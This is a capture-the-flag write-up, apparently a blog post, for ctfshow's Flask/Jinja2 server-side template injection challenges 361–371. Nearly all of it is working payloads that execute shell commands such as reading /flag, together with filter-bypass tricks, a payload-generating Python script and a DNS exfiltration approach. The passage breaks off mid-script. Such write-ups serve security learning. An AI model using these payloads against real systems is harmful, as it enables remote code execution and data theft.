---
title: ctfshow web入门 SSTI WP
tags: 
- SSTI
- python
- flask
date: 2021-1-7 19:25:00
categories:
- CTF
- 安全
- CTFSHOW
---

## 361 362

```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
```

## 363

过滤引号

```python
{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&os=os&command=cat /flag
```

## 364

args又被过滤

```python
?name={{config.__class__.__init__.__globals__[request.cookies.os].popen(request.cookies.command).read()}}

cookie: os=os;command=cat /flag
```

## 365

[]被过滤

```python
/?name={{config.__class__.__init__.__globals__.get(request.cookies.os).popen(request.cookies.command).read()}}
cookie: os=os;command=cat /flag
```

## 366 367

_ 又被过滤

```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(191)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
=> 
{{()|attr(request.cookies.class)|attr(request.cookies.base)|attr(request.cookies.subclasses)()|attr(request.cookies.getitem)(191)|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem)(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.eval)(request.cookies.command)}}
cookie: class=__class__;base=__base__;subclasses=__subclasses__;getitem=__getitem__;init=__init__;globals=__globals__;builtins=__builtins__;eval=eval;command=__import__("os").popen("cat /flag").read()
```

191这个位置是用burp爆破出来的

## 368

{{被过滤

```python
{%print(()|attr(request.cookies.class)|attr(request.cookies.base)|attr(request.cookies.subclasses)()|attr(request.cookies.getitem)(191)|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem)(request.cookies.builtins)|attr(request.cookies.getitem)(request.cookies.eval)(request.cookies.command))%}
cookie: class=__class__;base=__base__;subclasses=__subclasses__;getitem=__getitem__;init=__init__;globals=__globals__;builtins=__builtins__;eval=eval;command=__import__("os").popen("cat /flag").read()
```

## 369

过滤有点多,过滤了: _ [] ' " {{ request args os

参考y1ng师傅https://www.gem-love.com/ctf/2598.html这个构造字符的技巧

> 另一种思路是利用内置类找到chr

payload:

```python
{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}
{% set do = dict(do=ro,c=dd)|join()%}
{% set doc = xhx*2~do~xhx*2%}
{% set spa = ((app|attr(doc)|list()).pop(102)|string())%}
{% set pt = ((app|attr(doc)|list()).pop(320)|string())%}
{% set yin = ((app|attr(doc)|list()).pop(337)|string())%}
{% set left = ((app|attr(doc)|list()).pop(264)|string())%}
{% set right = ((app|attr(doc)|list()).pop(286)|string())%}
{% set ini = dict(in=ro,it=dd)|join()%}
{% set init = xhx*2~ini~xhx*2%}
{% set glob = dict(glo=ro,bals=dd)|join()%}
{% set globals = xhx*2~glob~xhx*2%}
{% set rep = dict(re=ro,pr=dd)|join()%}
{% set repr = xhx*2~rep~xhx*2%}
{% set slas = (y1ng|attr(init)|attr(globals)|attr(repr)()|list()).pop(349)%}
{% set bu = dict(buil=aa,tins=dd)|join() %}
{% set im = dict(imp=aa,ort=dd)|join() %}
{% set sy = dict(po=aa,pen=dd)|join() %}
{% set ox = dict(o=aa,s=dd)|join() %}
{% set ca = dict(ca=aa,t=dd)|join() %}
{% set flg = dict(fl=aa,ag=dd)|join() %}
{% set ev = dict(ev=aa,al=dd)|join() %}
{% set red = dict(re=aa,ad=dd)|join()%}
{% set bul = xhx*2~bu~xhx*2 %}
{% set pld = xhx*2~im~xhx*2~left~yin~ox~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} 

{% set cla = dict(cla=ro,ss=dd)|join()%}
{% set class = xhx*2~cla~xhx*2%}
{% set ba = dict(ba=ro,se=dd)|join()%}
{% set base = xhx*2~ba~xhx*2%}
{% set subcla = dict(subc=ro,lasses=dd)|join()%}
{% set subclasses = xhx*2~subcla~xhx*2%}
{% set getit = dict(get=ro,item=dd)|join()%}
{% set getitem = xhx*2~getit~xhx*2%}
{%print(()|attr(class)|attr(base)|attr(subclasses)()|attr(getitem)(191)|attr(init)|attr(globals)|attr(getitm)(bul)|attr(getitem)(ev)(pld))%}
```

## 370

过滤加上数字.可以利用过滤器构造

写了个脚本来构造:

```python
import requests
def getNum(x):
    if x == 0:
        return 'zero'
    if x == 1:
        return 'one'
    if x == 2:
        return 'two'
    if x == 3:
        return 'three'
    if x == 4:
        return 'four'
    if x == 5:
        return 'five'
    if x == 6:
        return 'six'
    if x == 7:
        return 'seven'
    if x == 8:
        return 'eight'
    if x == 9:
        return 'nine'
    else:
        numBIn = bin(x)[2:][::-1]
        num = ''
        mi = 0
        for i in numBIn:
            num = num + getNum(int(i)) + '*(' + getNum(2) + '**' + getNum(mi) + ')+'
            mi = mi + 1
        return '(' + num[:-1] + ')'


payload = ''
payload = payload + '{%set one=(a,)|wordcount%}{%set zero=one-one%}{%set two=(a,a)|wordcount%}{%set three=(a,a,a)|wordcount%}{%set four=(a,a,a,a)|wordcount%}{%set five=(a,a,a,a,a)|wordcount%}{%set six=(a,a,a,a,a,a)|wordcount%}{%set seven=(a,a,a,a,a,a,a)|wordcount%}{%set eight=(a,a,a,a,a,a,a,a)|wordcount%}{%set nine=(a,a,a,a,a,a,a,a,a)|wordcount%}'
payload = payload + '{% set xhx = (({ }|select()|string()|list()).pop(' + getNum(24) + ')|string())%}'
payload = payload + '{% set do = dict(do=ro,c=dd)|join()%}'
payload = payload + '{% set doc = xhx*two~do~xhx*two%}'
payload = payload + '{% set spa = ((app|attr(doc)|list()).pop(' + getNum(102) + ')|string())%}'
payload = payload + '{% set pt = ((app|attr(doc)|list()).pop(' + getNum(320) + ')|string())%}'
payload = payload + '{% set yin = ((app|attr(doc)|list()).pop(' + getNum(337) + ')|string())%}'
payload = payload + '{% set left = ((app|attr(doc)|list()).pop(' + getNum(264) + ')|string())%}'
payload = payload + '{% set right = ((app|attr(doc)|list()).pop(' + getNum(286) + ')|string())%}'
payload = payload + '{% set ini = dict(in=ro,it=dd)|join()%}' + '{% set init = xhx*two~ini~xhx*two%}'
payload = payload + '{% set glob = dict(glo=ro,bals=dd)|join()%}' + '{% set globals = xhx*two~glob~xhx*two%}'
payload = payload + '{% set rep = dict(re=ro,pr=dd)|join()%}{% set repr = xhx*two~rep~xhx*two%}'
payload = payload + '{% set slas = (x|attr(init)|attr(globals)|attr(repr)()|list()).pop(' + getNum(349) + ')%}'
payload = payload + '{% set bu = dict(buil=aa,tins=dd)|join() %}{% set im = dict(imp=aa,ort=dd)|join() %}{% set sy = dict(po=aa,pen=dd)|join() %}{% set ox = dict(o=aa,s=dd)|join() %}{% set ca = dict(ca=aa,t=dd)|join() %}{% set flg = dict(fl=aa,ag=dd)|join() %}{% set ev = dict(ev=aa,al=dd)|join() %}{% set red = dict(re=aa,ad=dd)|join()%}'
payload = payload + '{% set bul = xhx*two~bu~xhx*two %}' + '{% set pld = xhx*two~im~xhx*two~left~yin~ox~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} '
payload = payload + '{% set cla = dict(cla=ro,ss=dd)|join()%}{% set class = xhx*two~cla~xhx*two%}{% set ba = dict(ba=ro,se=dd)|join()%}{% set base = xhx*two~ba~xhx*two%}{% set subcla = dict(subc=ro,lasses=dd)|join()%}{% set subclasses = xhx*two~subcla~xhx*two%}{% set getit = dict(get=ro,item=dd)|join()%}{% set getitem = xhx*two~getit~xhx*two%}'
payload = payload + '{%print(()|attr(class)|attr(base)|attr(subclasses)()|attr(getitem)(' + getNum(
    191) + ')|attr(init)|attr(globals)|attr(getitem)(bul)|attr(getitem)(ev)(pld))%}'

payload = payload.replace('+','%2b')
print(payload)
```

payload:

```python
{%set%20one=(a,)|wordcount%}{%set%20zero=one-one%}{%set%20two=(a,a)|wordcount%}{%set%20three=(a,a,a)|wordcount%}{%set%20four=(a,a,a,a)|wordcount%}{%set%20five=(a,a,a,a,a)|wordcount%}{%set%20six=(a,a,a,a,a,a)|wordcount%}{%set%20seven=(a,a,a,a,a,a,a)|wordcount%}{%set%20eight=(a,a,a,a,a,a,a,a)|wordcount%}{%set%20nine=(a,a,a,a,a,a,a,a,a)|wordcount%}
{%%20set%20xhx%20=%20(({%20}|select()|string()|list()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bone*(two**four)))|string())%}{%%20set%20do%20=%20dict(do=ro,c=dd)|join()%}{%%20set%20doc%20=%20xhx*two~do~xhx*two%}{%%20set%20spa%20=%20((app|attr(doc)|list()).pop((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))|string())%}{%%20set%20pt%20=%20((app|attr(doc)|list()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bzero*(two**five)%2bone*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%}{%%20set%20yin%20=%20((app|attr(doc)|list()).pop((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%}{%%20set%20left%20=%20((app|attr(doc)|list()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bzero*(two**five)%2bzero*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%}{%%20set%20right%20=%20((app|attr(doc)|list()).pop((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bzero*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))|string())%}{%%20set%20ini%20=%20dict(in=ro,it=dd)|join()%}{%%20set%20init%20=%20xhx*two~ini~xhx*two%}{%%20set%20glob%20=%20dict(glo=ro,bals=dd)|join()%}{%%20set%20globals%20=%20xhx*two~glob~xhx*two%}{%%20set%20rep%20=%20dict(re=ro,pr=dd)|join()%}{%%20set%20repr%20=%20xhx*two~rep~xhx*two%}{%%20set%20slas%20=%20(x|attr(init)|attr(globals)|attr(repr)()|list()).pop((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)%2bzero*(two**seven)%2bone*(two**eight)))%}{%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%}{%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%}{%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%}{%%20set%20ox%20=%20dict(o=aa,s=dd)|join()%20%}{%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%}{%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%}{%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%}{%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%}{%%20set%20bul%20=%20xhx*two~bu~xhx*two%20%}{%%20set%20pld%20=%20xhx*two~im~xhx*two~left~yin~ox~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%}%20{%%20set%20cla%20=%20dict(cla=ro,ss=dd)|join()%}{%%20set%20class%20=%20xhx*two~cla~xhx*two%}{%%20set%20ba%20=%20dict(ba=ro,se=dd)|join()%}{%%20set%20base%20=%20xhx*two~ba~xhx*two%}{%%20set%20subcla%20=%20dict(subc=ro,lasses=dd)|join()%}{%%20set%20subclasses%20=%20xhx*two~subcla~xhx*two%}{%%20set%20getit%20=%20dict(get=ro,item=dd)|join()%}{%%20set%20getitem%20=%20xhx*two~getit~xhx*two%}{%print(()|attr(class)|attr(base)|attr(subclasses)()|attr(getitem)((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bone*(two**five)%2bzero*(two**six)%2bone*(two**seven)))|attr(init)|attr(globals)|attr(getitem)(bul)|attr(getitem)(ev)(pld))%}
```

或者 下面这个

```python
{%set%20one=(a,)|wordcount%}{%set%20zero=one-one%}{%set%20two=(a,a)|wordcount%}{%set%20three=(a,a,a)|wordcount%}{%set%20four=(a,a,a,a)|wordcount%}{%set%20five=(a,a,a,a,a)|wordcount%}{%set%20six=(a,a,a,a,a,a)|wordcount%}{%set%20seven=(a,a,a,a,a,a,a)|wordcount%}{%set%20eight=(a,a,a,a,a,a,a,a)|wordcount%}{%set%20nine=(a,a,a,a,a,a,a,a,a)|wordcount%}
{% set xhx = (({}|select()|string()|list()).pop((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bone*(two**four)))|string())%}
{% set ini = dict(in=ro,it=dd)|join()%}
{% set init = xhx~xhx~ini~xhx~xhx%}
{% set glob = dict(glo=ro,bals=dd)|join()%}
{% set globals = xhx~xhx~glob~xhx~xhx%}
{% set getit = dict(get=ro,item=dd)|join()%}
{% set getitem = xhx~xhx~getit~xhx~xhx%}
{% set bu = dict(buil=aa,tins=dd)|join() %}
{% set bul = xhx~xhx~bu~xhx~xhx %}
{% set x=(q|attr(init)|attr(globals)|attr(getitem))(bul)%}
{%set chr = x.chr%}

{%set cmda=chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bone*(two**four)%2bzero*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((zero*(two**zero)%2bone*(two**one)%2bone*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((zero*(two**zero)%2bone*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bone*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bone*(two**two)%2bzero*(two**three)%2bzero*(two**four)%2bone*(two**five)%2bone*(two**six)))~chr((zero*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))~chr((one*(two**zero)%2bzero*(two**one)%2bzero*(two**two)%2bone*(two**three)%2bzero*(two**four)%2bone*(two**five)))%}
{%print(x.eval(cmda))%}
# __import__('os').popen('cat /flag').read()
```

## 371

折腾了好久,最后用dns外带数据

![1609850842580](1609850842580.png)

```python
{%set%20B=(a,)|wordcount%}
{%set%20A=B-B%}
{%set%20C=(a,a)|wordcount%}
{%set%20D=(a,a,a)|wordcount%}
{%set%20E=(a,a,a,a)|wordcount%}
{%set%20F=(a,a,a,a,a)|wordcount%}
{%set%20G=(a,a,a,a,a,a)|wordcount%}
{%set%20H=(a,a,a,a,a,a,a)|wordcount%}
{%set%20I=(a,a,a,a,a,a,a,a)|wordcount%}
{%set%20J=(a,a,a,a,a,a,a,a,a)|wordcount%}

{% set xhx = (({}|select()|string()|list()).pop((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bB*(C**E)))|string())%}
{% set ini = dict(in=ro,it=dd)|join()%}
{% set init = xhx~xhx~ini~xhx~xhx%}
{% set glob = dict(glo=ro,bals=dd)|join()%}
{% set globals = xhx~xhx~glob~xhx~xhx%}
{% set getit = dict(get=ro,item=dd)|join()%}
{% set getitem = xhx~xhx~getit~xhx~xhx%}
{% set bu = dict(buil=aa,tins=dd)|join() %}
{% set bul = xhx~xhx~bu~xhx~xhx %}
{% set x=(q|attr(init)|attr(globals)|attr(getitem))(bul)%}
{%set chr = x.chr%}

{%set cmda=chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))%}
{%if (x.eval(cmda))%}sssss{%endif%}
```

转换脚本:

```python
def getNum(x):
    if x == 0:
        return 'A'
    if x == 1:
        return 'B'
    if x == 2:
        return 'C'
    if x == 3:
